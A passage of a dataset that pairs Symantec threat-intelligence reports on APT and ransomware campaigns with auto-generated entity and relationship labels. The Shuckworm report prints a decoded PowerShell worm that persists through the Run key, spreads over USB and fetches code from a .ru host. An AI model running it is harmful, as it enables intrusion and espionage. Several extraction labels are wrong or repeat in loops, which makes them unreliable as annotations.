          "Social Engineering",
          "connectedTo",
          "Syssphinx"
        ],
        [
          "Spear Phishing",
          "executedBy",
          "Syssphinx"
        ],
        [
          "Social Engineering",
          "executedBy",
          "Syssphinx"
        ],
        [
          "Spear Phishing",
          "launchedBy",
          "Syssphinx"
        ],
        [
          "Social Engineering",
          "launchedBy",
          "Syssphinx"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 15,
    "relationship_count": 14
  },
  {
    "title": "microsoft zeroday exploit",
    "link": "https://www.security.com/threat-intelligence/microsoft-zeroday-exploit",
    "content": "A zero-day vulnerability (CVE-2023-36884) affecting Microsoft Windows and Office products is being exploited by attackers in the wild. To date, the exploit has been used in highly targeted attacks against organizations in the government and defense sectors in Europe and North America. The vulnerabilitywas disclosed yesterday (July 11) by Microsoft, which said that an attacker could create a specially crafted Microsoft Office document that enables remote code execution on the target’s computer. In order for the exploit to succeed, the victim needs to open the malicious file. No patch has been released yet for the vulnerability. However, Microsoft is still investigating the issue and said a patch may be rolled out in its monthly release process or in an out-of-cycle security update. The company provided some mitigation guidance in its advisory. How is the vulnerability being exploited? According to aseparate blog published by Microsoft, the vulnerability was being exploited by an actor it calls Storm-0978 (aka RomCom) in targeted attacks against defense and government organizations in Europe and North America. The exploit was contained in Microsoft Word documents that masqueraded as information about the Ukrainian World Congress. The attacks wereearlier documented by BlackBerryon July 8, which noted that the targets were guests for the upcoming NATO Summit. At the time, the use of the zero-day in the attacks was unknown. Who is Storm-0978/RomCom? Storm-0978/RomCom is a Russia-linked threat actor that has been involved in both espionage and cyber-crime activity. The group acquired its name through its use of the RomCom remote access Trojan (RAT). There are strong ties between it and a group Symantec calls Hawker, which is the developer of the Cuba ransomware family. TheU.S Cybersecurity and Infrastructure Security Agency (CISA) has saidthat there are possibly links between Hawker, RomCom, and the Industrial Spy ransomware actors. Areport published last year by Palo Altoalso detailed how RomCom (whom it calls Tropical Scorpius) used the RomCom RAT to deliver the Cuba ransomware payload to victims. While it is clear that there are strong ties between Storm-0978/RomCom and Hawker, it is unclear yet whether the two actors are one and the same. How severe is this vulnerability? Until a patch is released, organizations should adopt all possible mitigation strategies. Although the vulnerability has, to date, been exploited in targeted attacks, news of its existence will doubtlessly lead other attackers to attempt to replicate the exploit. Symantec is continuing to investigate further possible protection based on available information, and additional signatures may be introduced as analysis progresses. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. a61b2eafcf39715031357df6b01e85e0d1ea2e8ee1dfec241b114e18f7a1163f e7cfeb023c3160a7366f209a16a6f6ea5a0bc9a3ddc16c6cba758114dfe6b539 d3263cc3eff826431c2016aee674c7e3e5329bebfb7a145907de39a279859f4a 3a3138c5add59d2172ad33bc6761f2f82ba344f3d03a2269c623f22c1a35df97 The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (CVE-2023-36884, Vulnerability), (Microsoft, Tool), (Storm-0978, Attacker), (RomCom, Attacker), (NATO Summit, Event)\nRelationships: (CVE-2023-36884, contains, Microsoft), (Storm-0978, associatedWith, NATO Summit), (RomCom, associatedWith, NATO Summit)",
      "entities": [
        [
          "CVE-2023-36884",
          "Vulnerability"
        ],
        [
          "Microsoft",
          "Tool"
        ],
        [
          "Storm-0978",
          "Attacker"
        ],
        [
          "RomCom",
          "Attacker"
        ],
        [
          "NATO Summit",
          "Event"
        ]
      ],
      "relationships": [
        [
          "CVE-2023-36884",
          "contains",
          "Microsoft"
        ],
        [
          "Storm-0978",
          "associatedWith",
          "NATO Summit"
        ],
        [
          "RomCom",
          "associatedWith",
          "NATO Summit"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 5,
    "relationship_count": 3
  },
  {
    "title": "flea backdoor microsoft graph apt15",
    "link": "https://www.security.com/threat-intelligence/flea-backdoor-microsoft-graph-apt15",
    "content": "The Flea (aka APT15, Nickel) advanced persistent threat (APT) group continued to focus on foreign ministries in a recent attack campaign that ran from late 2022 into early 2023 in which it leveraged a new backdoor called Backdoor.Graphican. This campaign was primarily focused on foreign affairs ministries in the Americas, although the group also targeted a government finance department in a country in the Americas and a corporation that sells products in Central and South America. There was also one victim based in a European country, which was something of an outlier. This victim had also previously suffered a seemingly unrelated ransomware attack in July 2022. However, the primary focus of the campaign observed by the Threat Hunter Team at Symantec, part of Broadcom, does appear to be on ministries of foreign affairs in the Americas. Flea has a track record of honing in on government targets, diplomatic missions, and embassies, likely for intelligence-gathering purposes. Flea used a large number of tools in this campaign. As well as the new Graphican backdoor, the attackers leveraged a variety of living-off-the-land tools, as well as tools that have been previously linked to Flea. We will detail these tools in this section. Graphican is an evolution of the known Flea backdoor Ketrican, which itself was based on a previous malware — BS2005 — also used by Flea. Graphican has the same basic functionality as Ketrican, with the difference between them being Graphican’s use of the Microsoft Graph API and OneDrive to obtain its command-and-control (C&C) infrastructure. This technique was used in a similar way by the Russian state-sponsored APT groupSwallowtail (aka APT28, Fancy Bear, Sofacy, Strontium) in a campaign in 2022in which it delivered the Graphite malware. In that campaign, the Graphite malware used the Microsoft Graph API and OneDrive as a C&C server. The observed Graphican samples did not have a hardcoded C&C server, rather they connected to OneDrive via the Microsoft Graph API to get the encrypted C&C server address from a child folder inside the \"Person\" folder. The malware then decoded the folder name and used it as a C&C server for the malware. All instances of this variant used the same parameters to authenticate to the Microsoft Graph API. We can assume they all have the same C&C, which can be dynamically changed by the threat actors. Once on a machine, Graphican does the following: Commands that can be executed by Graphican include: During the course of this campaign, we also observed an updated version of Ketrican, which had a hardcoded C&C server and only implemented the ‘C’, ‘U’, and ‘D’ commands. We also saw an older version of Ketrican (compiled in 2020) that implemented only the ‘N’ and ‘P’ commands. This demonstrates that the group is actively developing and adapting Ketrican to suit its objectives. Other tools leveraged by Flea in this recent activity include: Flea has been in operation since at least 2004. Over that time its tactics, techniques, and procedures (TTPs), as well as its targeting, have changed and developed. In recent years, the group has primarily focused on attacks against government organizations, diplomatic entities, and non-governmental organizations (NGOs) for the purposes of intelligence gathering. North and South America does appear to have become more of a focus for the group in recent times, which aligns with the targeting we saw in this campaign. The goal of the group does seem to be to gain persistent access to the networks of victims of interest for the purposes of intelligence gathering. Its targets in this campaign, of ministries of foreign affairs, also point to a likely geo-political motive behind the campaign. Flea traditionally used email as an initial infection vector, but there have also been reports of it exploiting public-facing applications, as well as using VPNs, to gain initial access to victim networks. Microsoft seized domains belonging to Fleain December 2021. The company seized 42 domains that it said were used in operations that targeted organizations in the U.S. and 28 other countries for intelligence-gathering purposes. Flea was also linked in a November 2022 report by Lookout to along-running campaign targeting Uyghur-language websites and social mediain China. Flea is believed to be a large and well-resourced group, and it appears that exposure of its activity, and even takedowns such as that detailed by Microsoft, have failed to have a significant impact when it comes to stopping the group’s activity. The use of a new backdoor by Flea shows that this group, despite its long years of operation, continues to actively develop new tools. The group has developed multiple custom tools over the years. The similarities in functionality between Graphican and the known Ketrican backdoor may indicate that the group is not very concerned about having activity attributed to it. The most noteworthy thing about Graphican itself is the abuse of the Microsoft Graph API and OneDrive to obtain its C&C server. The fact that a similar technique was used by Swallowtail, an unconnected APT group operating out of a different region, is also worth noting. Once a technique is used by one threat actor, we often see other groups follow suit, so it will be interesting to see if this technique is something we see being adopted more widely by other APT groups and cyber criminals. Flea’s targets — foreign ministries — are also interesting; though they do align with the targets the group has directed its activity at in the past. It appears the Flea’s interests remain similar to what they have been in recent years, even as its tools and techniques continue to evolve. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Flea, Attacker), (backdoor.Graphican, Malware), (BS2005, Malware), (Ketrican, Malware)\nRelationships: (Flea, uses, backdoor.Graphican), (Flea, uses, BS2005), (Flea, uses, Ketrican)",
      "entities": [
        [
          "Flea",
          "Attacker"
        ],
        [
          "backdoor.Graphican",
          "Malware"
        ],
        [
          "BS2005",
          "Malware"
        ],
        [
          "Ketrican",
          "Malware"
        ]
      ],
      "relationships": [
        [
          "Flea",
          "uses",
          "backdoor.Graphican"
        ],
        [
          "Flea",
          "uses",
          "BS2005"
        ],
        [
          "Flea",
          "uses",
          "Ketrican"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 4,
    "relationship_count": 3
  },
  {
    "title": "shuckworm russia ukraine military",
    "link": "https://www.security.com/threat-intelligence/shuckworm-russia-ukraine-military",
    "content": "The Shuckworm espionage group is continuing to mount multiple cyber attacks against Ukraine, with recent targets including security services, military, and government organizations. In some cases, Shuckworm has succeeded in staging long-running intrusions, lasting for as long as three months. The attackers repeatedly attempted to access and steal sensitive information such as reports about the deaths of Ukrainian military service members, enemy engagements and air strikes, arsenal inventories, military training, and more. In a bid to stay ahead of detection, Shuckworm has repeatedly refreshed its toolset, rolling out new versions of known tools and short-lived infrastructure, along with new additions, such as USB propagation malware. Shuckworm (aka Gamaredon, Armageddon) is a Russia-linked group that has almost exclusively focused its operations on Ukraine since it first appeared in 2014. Ukrainian officials have publicly stated that the group operates on behalf of the Russian Federal Security Service (FSB). Shuckworm is known to use phishing emails as an initial infection vector, in order to gain access to victim machines and distribute malware. The attackers send emails with malicious attachments to Ukrainian victims, with the attachments of various file types, such as: The victim lures we observed related to armed conflicts, criminal proceedings, combating crime, and protection of children, among others. Once victims were infected, the attackers then proceed to download additional backdoors and tools onto targeted machines. Shuckworm has also been observed using a new PowerShell script in order to spread its custom backdoor malware, Pterodo, via USB. Researchers from Symantec, part of Broadcom,blogged about Backdoor.Pterodo in April 2022, documenting how we had found four variants of the backdoor with similar functionality. The variants are Visual Basic Script (VBS) droppers that will drop a VBScript file, use Scheduled Tasks (shtasks.exe) to maintain persistence, and download additional code from a command-and-control (C&C) server. Examples of recent scheduled tasks include execution of the following command lines: The new PowerShell script is used to first copy itself onto the infected machine and create a shortcut file using anrtk.lnkextension. The script uses file names such as “porn_video.rtf.lnk”, “do_not_delete.rtf.lnk”” and “evidence.rtf.lnk” in an attempt to entice individuals to open the files. These file names are generally in Ukrainian, but some are also in English. Next, the script enumerates all drives, copying itself to any available removable disks – USB drives. These USB drives are likely used by the attackers for lateral movement across victim networks and may be used to help the attackers reach air-gapped machines within targeted organizations. In this recent activity, we also observed the group leveraging legitimate services to act as C&C servers, including using the Telegram messaging service for its C&C infrastructure. More recently, they have also used Telegram’s micro-blogging platform, called Telegraph, to store C&C addresses. Shuckworm tends to only use its C&C infrastructure for short periods of time, limiting the usefulness of its C&Cs when it comes to finding more activity or linking activity together. However, the group does use SSL certificates that have some commonalities that may be leveraged for tracking purposes. We believe the group is likely leveraging pre-configured images for use in its C&C deployment. These data points can help researchers to identify additional C&C infrastructure and Shuckworm activity. Symantec also saw what was likely Giddome, an infostealer tool that is a known Shuckworm backdoor, deployed onto victim networks to steal and exfiltrate data of interest. The following describes a typical attack chain seen on a victim machine compromised by Shuckworm in this campaign. In one attack, the first sign of malicious activity was when the user appeared to open a RAR archive file that was likely delivered via a spear-phishing email and which contained a malicious document. After the document was opened, a malicious PowerShell command was observed being executed to download the next-stage payload from the attackers’ C&C server: More recently, Symantec has observed Shuckworm leveraging more IP addresses in their PowerShell scripts. This is likely an attempt to evade some tracking methods employed by researchers. Shuckworm also continues to update the obfuscation techniques used in its PowerShell scripts in an attempt to avoid detection, with up to 25 new variants of the group’s scripts observed per month between January and April 2023. Next, a VBS script, which was Shuckworm’s Pterodo backdoor, was executed: Following this, we saw what appeared to be multiple similar scripts being executed. The machine used for this activity appeared to contain multiple confidential documents related to Ukrainian security services or government departments. On a different machine, we saw malicious activity that appeared to be executed from a file (foto.safe) that had been dropped by an infected USB key that someone had plugged into the system. Symantec observed multiple file paths present on infected machines that indicate users had plugged in an infected USB key e.g. \"usb-накопитель\" translates as \"usb-drive\". The foto.safe file is a Base64-encoded script. Decoded it looks like the following: fUNCtIon sET-lnK ($chILd) { $nAMetxt = \"foto.sAfe\".TolowER(); $NAmE = (\"кОМПРОМат\", \"КОРЗиНА\", \"СеКРетнО\" | GeT-rAnDOm).ToUPPeR(); $WSHSHELl = NEw-obJeCT -CoMObjeCT WSCriPT.shELL; $sHORTcut = $wShShEll.CREatesHoRTCUt($cHild +\"\\$nAMe.LNK\"); $shoRtCuT.iConloCaTiON = \"C:\\wiNDoWS\\SysteM32\\SHELL32.DLL,3\"; $SHOrTcUT.TArGetpAth = \"c:\\wInDOwS\\sYstEm32\\WInDOwSpowERshell\\V1.0\\POwERShEll.ExE\".ToLoweR(); $text = \"-wInDoWsTYlE hidDeN -nolOgo Iex (IeX (GeT-cOnTent .\\$NAMetxt | OUT-STrIng))\".TOlower(); $sHORTCUT.ArGUMEnTs = $tExt; $mYfIlE= $chIlD+\"\\$naMeTXT\" cOPY-Item $enV:UsErprOfilE\\iNdEx.phP -deSTINAtION $mYfILE $FIlE=GEt-ITEM $mYfiLE -forCe $FiLe.ATtRiButes='hiDDEN' Set-ITemPRoPERTY -pAth HkCU:\\soFTWare\\MicROsOfT\\WiNDows\\cURRENtVerSiON\\ruN -NAME safE -valUE $env:windir'\\sYSTeM32\\wINDoWSPowErSHEll\\v1.0\\pOwERShell.eXE -WIndowSTYlE hiddEN -noLOgO inVOkE-ExpREsSIOn (get-contEnT $eNV:usERPRoFILe\\INdEX.PHp | Out-sTRing) | poweRSHeLL -noPROfILE'; coPy-item  .\\\"fOtO.safe\"  -dEsTInaTioN $Env:USeRprOFIle\\iNdEX.pHp $urLs = 'hTTP://'+ [SYSTEM.NEt.DnS]::geThostadDREsSes([String]$(GEt-random)+'.cOriDAS.Ru') +'/slEEP.Php'; iEX $(New-ObJeCt Net.WEBClient).uPloAdStRING($uRls.ToloWER(),'') $drIVE = GeT-wmIoBJeCt WIN32_VOluME -fILTer \"drIvETYPe='2'\"; $Drive.naMe | FOreaCH-oBJecT{ $CHiLdS = GET-ChilDITem $drivE.nAMe foReach($cHilDs IN $chiLDs) if( [SYsTEM.io.fiLE]::GetAttributES($ChilDS.FuLlnAMe) -eq [SYsTEM.Io.fILeaTTrIbuTES]::DIRecToRy ) sET-lnk $chILds.fUlLName IF(($dRIVe.CapaCITY - $DriVe.fREeSPACE) -Gt 1000000){ This PowerShell script is used to copy itself onto the infected machine and then create a shortcut file that links to the PowerShell script. Symantec has identified multiple variants of this script that can be used to indicate successful infection, or to download additional tools onto infected machines. One of the most significant things about this campaign is the targets, which include Ukrainian military, security, research, and government organizations. The attackers were observed focusing on machines that contained what appeared from file names to be sensitive military information that may be abused to support Russian kinetic war efforts. The majority of these attacks began in February/March 2023, with the attackers maintaining a presence on some of the victim machines until May. The sectors and nature of the organizations and machines targeted may have given the attackers access to significant amounts of sensitive information. There were indications in some organizations that the attackers were on the machines of the organizations’ human resources departments, indicating that information about individuals working at the various organizations was a priority for the attackers, among other things. This activity demonstrates that Shuckworm’s relentless focus on Ukraine continues. It seems clear that Russian nation-state-backed attack groups continue to prioritize high-value Ukrainian targets in attempts to find data that may potentially help their military operations. For the latest protection updates, please visit theSymantec Protection Bulletin. USB propagation scripts Example of LNK files created Recent C&C infrastructure (2023) The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Shuckworm, Attacker), (Ukraine, Target), (Gamaredon, aka), (armageddon, aka), (Russia, Country), (FSB, Organization), (armed conflicts, Threat Type), (criminal proceedings, Threat Type), (combating crime, Threat Type), (protection of children, Threat Type), (USB propagation malware, Malware), (Phishing, Technique), (Malicious attachment, File), (ad, File)\nRelationships: (Shuckworm, uses, Phishing), (Shuckworm, targets, Ukraine), (Shuckworm, uses, USB propagation malware), (Shuckworm, uses, Malicious attachment), (Shuckworm, associatedWith, FSB), (Shuckworm, associatedWith, Russia), (Shuckworm, associatedWith, Gamaredon), (Shuckworm, associatedWith, armageddon), (Shuckworm, associatedWith, Ukraine), (Shuckworm, associatedWith, FSB), (Shuckworm, associatedWith, Russia), (Shuckworm, associatedWith, Gamaredon), (Shuckworm, associatedWith, armageddon), (Shuckworm, associatedWith, Ukraine), (Shuckworm, associatedWith, FSB), (Shuckworm, associatedWith, Russia), (Shuckworm, associatedWith, Gamaredon), (Shuckworm, associatedWith, armageddon), (Sh",
      "entities": [
        [
          "Shuckworm",
          "Attacker"
        ],
        [
          "Ukraine",
          "Target"
        ],
        [
          "Gamaredon",
          "aka"
        ],
        [
          "armageddon",
          "aka"
        ],
        [
          "Russia",
          "Country"
        ],
        [
          "FSB",
          "Organization"
        ],
        [
          "armed conflicts",
          "Threat Type"
        ],
        [
          "criminal proceedings",
          "Threat Type"
        ],
        [
          "combating crime",
          "Threat Type"
        ],
        [
          "protection of children",
          "Threat Type"
        ],
        [
          "USB propagation malware",
          "Malware"
        ],
        [
          "Phishing",
          "Technique"
        ],
        [
          "Malicious attachment",
          "File"
        ],
        [
          "ad",
          "File"
        ]
      ],
      "relationships": [
        [
          "Shuckworm",
          "uses",
          "Phishing"
        ],
        [
          "Shuckworm",
          "targets",
          "Ukraine"
        ],
        [
          "Shuckworm",
          "uses",
          "USB propagation malware"
        ],
        [
          "Shuckworm",
          "uses",
          "Malicious attachment"
        ],
        [
          "Shuckworm",
          "associatedWith",
          "FSB"
        ],
        [
          "Shuckworm",
          "associatedWith",
          "Russia"
        ],
        [
          "Shuckworm",
          "associatedWith",
          "Gamaredon"
        ],
        [
          "Shuckworm",
          "associatedWith",
          "armageddon"
        ],
        [
          "Shuckworm",
          "associatedWith",
          "Ukraine"
        ],
        [
          "Shuckworm",
          "associatedWith",
          "FSB"
        ],
        [
          "Shuckworm",
          "associatedWith",
          "Russia"
        ],
        [
          "Shuckworm",
          "associatedWith",
          "Gamaredon"
        ],
        [
          "Shuckworm",
          "associatedWith",
          "armageddon"
        ],
        [
          "Shuckworm",
          "associatedWith",
          "Ukraine"
        ],
        [
          "Shuckworm",
          "associatedWith",
          "FSB"
        ],
        [
          "Shuckworm",
          "associatedWith",
          "Russia"
        ],
        [
          "Shuckworm",
          "associatedWith",
          "Gamaredon"
        ],
        [
          "Shuckworm",
          "associatedWith",
          "armageddon"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 14,
    "relationship_count": 18
  },
  {
    "title": "moveit vulnerabilities exploits",
    "link": "https://www.security.com/threat-intelligence/moveit-vulnerabilities-exploits",
    "content": "Extortion actors have been actively exploiting a recently patched vulnerability in MOVEit Transfer, a file-transfer application that is widely used to transmit information between organizations. The nature of the software affected means that attackers can exploit unpatched systems to mount a supply chain attack against multiple organizations. While the original vulnerability (CVE-2023-34362) was patched on May 31, MOVEit Transfer’s developersannounced on Friday (June 9)that multiple additional vulnerabilities (CVEs pending) have also been identified and patched. Prior to its patching, attackers linked to the Clop ransomware operation were already exploiting CVE-2023-34362 as a zero-day vulnerability. Proof-of-concept code for the exploit is now publicly available, meaning other attackers are now likely to attempt to exploit unpatched systems. What is MOVEit Transfer? MOVEit Transfer is a managed file-transfer application developed by Progress Software. It is designed to permit secure transfer of files between businesses and their customers. What is the nature of the vulnerability? The original vulnerability (CVE-2023-34362) occurs in the MOVEit Transfer web application. It affected all versions prior to 2021.0.6 (13.0.6), 2021.1.4 (13.1.4), 2022.0.4 (14.0.4), 2022.1.5 (14.1.5), and 2023.0.1 (15.0.1). “[An] attacker may be able to infer information about the structure and contents of the database in addition to executing SQL statements that alter or delete database elements,” Progress said. For how long was the vulnerability being exploited before it was patched? According to a U.S. government advisory, active exploitation appears to have begun on May 27, 2023. How has the vulnerability been exploited to date? The vulnerability is being actively exploited by the Clop ransomware operation. According toa joint advisory issued by the U.S. Federal Bureau of Investigation (FBI) and the Cybersecurity and Infrastructure Security Agency (CISA), the attackers exploited the vulnerability to install a web shell called Lemurloot (JS.Malscript!g1) on affected systems. This was then used to steal data from underlying databases. Lemurloot was designed specifically to target the MOVEit Transfer platform. It authenticates incoming HTTPS requests via a hard-coded password; runs commands that will download files from the MOVEit Transfer database; extracts its Azure system settings; retrieves records; and can create, insert, or delete a particular user. When responding to a request, Lemurloot returns stolen data in a comfile format. Shortly after the disclosure of the vulnerability, attackers linked to the Clop ransomware operationclaimed responsibility for the attackand said that they had stolen data from multiple MOVEit users and their customers. It threatened to release the stolen data unless a ransom is paid. What is known about Clop? Clop is an extortion and ransomware operation run by a cyber-crime group known as Snakefly (aka TA505, FIN11). While the group initially extorted victims by encrypting files using its own ransomware payload (Ransom.Clop), in recent times it has been known to eschew encryption entirely and rely on the threat of leaking stolen data to extort its victims. The group has a track record in exploiting zero-day vulnerabilities. In 2021, it was linked to theexploitation of multiple vulnerabilities in Accellion FTA, another file-transfer application. Earlier this year it was responsible for exploiting a zero-day vulnerability (CVE-2023-0669) in the GoAnywhere MFT platform. How do Symantec products guard against exploitation of this vulnerability? Symantec products will guard against exploit attempts and payloads with the following detections: Machine learning-based Data Center Security (DCS) default hardening policies such as sym_win_hardened_sbp provide 0-day protection for CVE-2023-34362. DCS policy control \"Software Install Restrictions\" for MS SQL, MS IIS and other hardened application sandboxes stop Clop ransomware from exploiting this vulnerability by preventing arbitrary deployment of webshells and unauthorized software. Observed domains/IPs are covered under security categories. For the latest protection updates, please visit theSymantec Protection Bulletin. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Extortion actors, Attacker), (MOVEit Transfer, Tool), (CVE-2023-34362, Vulnerability), (Progress Software, Company), (Clop ransomware, Threat Actor), (SQL, Technology)\nRelationships: (Extortion actors, uses, MOVEit Transfer), (MOVEit Transfer, contains, CVE-2023-34362), (Clop ransomware, exploits, CVE-2023-34362), (Progress Software, develops, MOVEit Transfer), (SQL, technology, not directly relevant but mentioned in context)",
      "entities": [
        [
          "Extortion actors",
          "Attacker"
        ],
        [
          "MOVEit Transfer",
          "Tool"
        ],
        [
          "CVE-2023-34362",
          "Vulnerability"
        ],
        [
          "Progress Software",
          "Company"
        ],
        [
          "Clop ransomware",
          "Threat Actor"
        ],
        [
          "SQL",
          "Technology"
        ]
      ],
      "relationships": [
        [
          "Extortion actors",
          "uses",
          "MOVEit Transfer"
        ],
        [
          "MOVEit Transfer",
          "contains",
          "CVE-2023-34362"
        ],
        [
          "Clop ransomware",
          "exploits",
          "CVE-2023-34362"
        ],
        [
          "Progress Software",
          "develops",
          "MOVEit Transfer"
        ],
        [
          "SQL",
          "technology",
          "not directly relevant but mentioned in context"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 6,
    "relationship_count": 5
  },
  {
    "title": "buhti ransomware",
    "link": "https://www.security.com/threat-intelligence/buhti-ransomware",
    "content": "A relatively new ransomware operation calling itself Buhti appears to be eschewing developing its own payload and is instead utilizing variants of the leaked LockBit and Babuk ransomware families to attack Windows and Linux systems. While the group doesn’t develop its own ransomware, it does utilize what appears to be one custom-developed tool, an information stealer designed to search for and archive specified file types. Buhti, which first came to public attention in February 2023, was initially reported to be attacking Linux computers. However, Symantec’s Threat Hunter Team has also uncovered attempts to attack Windows computers on compromised networks. The group appears to be quick to exploit recently disclosed vulnerabilities, with one recent attack exploiting the recently patched PaperCut vulnerability. Since Buhti hasn’t been linked to any known cyber-crime group, Symantec has assigned the actor name Blacktail to its operators. A recent Buhti attack saw the attackers attempt to deploy a ransomware payload against Windows computers on the targeted network. Analysis of the payload revealed that it was a minimally modified version of the leaked LockBit 3.0 (aka LockBit Black) ransomware. Encrypted files are appended with a .buthi extension. The ransom note can be seen in Figure 1. The ransomware includes a feature that drops a LockBit-branded .bmp file (Figure 2) and makes it the Windows wallpaper, but this functionality was disabled by the attackers. The ransomware also has the capability to send system information about the infected computer to a command-and-control (C&C) server, but this functionality is also disabled and no C&C server is specified. LockBit 3.0 was developed for the Syrphid cyber-crime group (aka Bitwise Spider), which is the operator of the LockBit ransomware. The builder for the ransomwarewas leaked in September 2022, allegedly by a disgruntled developer. While Buhti came to public attention for targeting Linux machines with a payload written in Golang, analysis by Symantec of multiple Linux payloads found that they were all variants of the leaked Babuk ransomware. Babuk was one of the first ransomware actors to target ESXi systems with a Linux payload. Babuk’s source code was leaked in 2021 and since then has been adopted and reused by multiple ransomware operations. The ransom note dropped by Linux variants was identical to that of the Windows payload; with only the payment address differing. Blacktail does appear to use at least one piece of custom malware, a data-exfiltration tool (SHA256: 9f0c35cc7aab2984d88490afdb515418306146ca72f49edbfbd85244e63cfabd). Written in Golang, it is designed to steal the following file types: .pdf, .php, .png, .ppt, .psd, .rar, .raw, .rtf, .sql, .svg, .swf, .tar, .txt, .wav, .wma, .wmv, .xls, .xml, .yml, .zip, .aiff, .aspx, .docx, .epub, .json, .mpeg, .pptx, .xlsx, .yaml. Copied files are placed into a .zip archive, which is created usingan open source utility called zip. The tool can be configured via command-line arguments to specify both the directory to search for files of interest in and the name of the output archive. The -o argument in the command line specifies the archive to be created. The -d argument specifies the directory to search for files of interest in. For example: CSIDL_WINDOWS\\temp\\xhfw.exe -o CSIDL_WINDOWS\\temp\\output.zip -d CSIDL_PROFILE Recent Buhti attacks exploited a recently discovered vulnerability in PaperCut NG and MF (CVE-2023-27350). The exploit allows an attacker to bypass authentication and remotely execute code. The vulnerability was disclosed and patched by PaperCut on March 15, 2023, and in recent weeks multiple threat actors have begun utilizing the exploit against unpatched systems. The attackers exploited the vulnerability in order to install Cobalt Strike, Meterpreter, Sliver, AnyDesk, and ConnectWise. The tools were leveraged to steal data from, and deliver the ransomware payload to, multiple computers on the targeted network. Blacktail appears quick to utilise new exploits. In February,they were reportedto be exploiting a vulnerability in IBM’s Aspera Faspex file-exchange application (CVE-2022-47986). While the reuse of leaked payloads is often the hallmark of a less-skilled ransomware operation, Blacktail’s general competence in carrying out attacks, coupled with its ability to recognize the utility of newly discovered vulnerabilities, suggests that it is not to be underestimated. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. 063fcedd3089e3cea8a7e07665ae033ba765b51a6dc1e7f54dde66a79c67e1e7 - Buhti (Windows) eda0328bfd45d85f4db5dbb4340f38692175a063b7321b49b2c8ebae3ab2868c - Buhti (Linux) e5d65e826b5379ca47a371505678bca6071f2538f98b5fef9e33b45da9c06206 - Buhti (Linux) d65225dc56d8ff0ea2205829c21b5803fcb03dc57a7e9da5062cbd74e1a6b7d6 - Buhti (Linux) d259be8dc016d8a2d9b89dbd7106e22a1df2164d84f80986baba5e9a51ed4a65 - Buhti (Linux) 8b5c261a2fdaf9637dada7472b1b5dd1d340a47a00fe7c39a79cf836ef77e441 - Buhti (Linux) 898d57b312603f091ff1a28cb2514a05bd9f0eb55ace5d6158cc118d1e37070a - Buhti (Linux) 515777b87d723ebd6ffd5b755d848bb7d7eb50fc85b038cf25d69ca7733bd855 - Buhti (Linux) 4dc407b28474c0b90f0c5173de5c4f1082c827864f045c4571890d967eadd880 - Buhti (Linux) 22e74756935a2720eadacf03dc8fe5e7579f354a6494734e2183095804ef19fe - Buhti (Linux) 18a79c8a97dcfff57e4984aa7e74aa6ded22af8e485e807b34b7654d6cf69eef - Buhti (Linux) 01b09b554c30675cc83d4b087b31f980ba14e9143d387954df484894115f82d4 - Buhti (Linux) 7eabd3ba288284403a9e041a82478d4b6490bc4b333d839cc73fa665b211982c - Buhti (Linux) 287c07d78cafc97fb4b7ef364a228b708d31e8fe8e9b144f7db7d986a1badd52 - Buhti (Linux) 32e815ef045a0975be2372b85449b25bd7a7c5a497c3facc2b54bcffcbb0041c - Cobalt Strike Beacon 5b3627910fe135475e48fd9e0e89e5ad958d3d500a0b1b5917f592dc6503ee72 - Cobalt Strike Beacon d59df9c859ccd76c321d03702f0914debbadc036e168e677c57b9dcc16e980cb - Cobalt Strike Beacon de052ce06fea7ae3d711654bc182d765a3f440d2630e700e642811c89491df72 - Cobalt Strike Beacon 65c91e22f5ce3133af93b69d8ce43de6b6ccac98fc8841fd485d74d30c2dbe7b - Meterpreter 8041b82b8d0a4b93327bc8f0b71672b0e8f300dc7849d78bb2d72e2e0f147334 - Meterpreter 8b2cf6af49fc3fb1f33e94ad02bd9e43c3c62ba2cfd25ff3dfc7a29dde2b20f2 - Meterpreter 97378d58815a1b87f07beefb24b40c5fb57f8cce649136ff57990b957aa9d56a – Meterpreter c33e56318e574c97521d14d68d24b882ffb0ed65d96203970b482d8b2c332351 - Meterpreter 9b8adde838c8ea2479b444ed0bb8c53b7e01e7460934a6f2e797de58c3a6a8bf - Possible Meterpreter 9f0c35cc7aab2984d88490afdb515418306146ca72f49edbfbd85244e63cfabd - Exfiltration tool ca6abfa37f92f45e1a69161f5686f719aaa95d82ad953d6201b0531fb07f0937 - Possible exfiltration tool bdfac069017d9126b1ad661febfab7eb1b8e70af1186a93cb4aff93911183f24 - Sliver The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
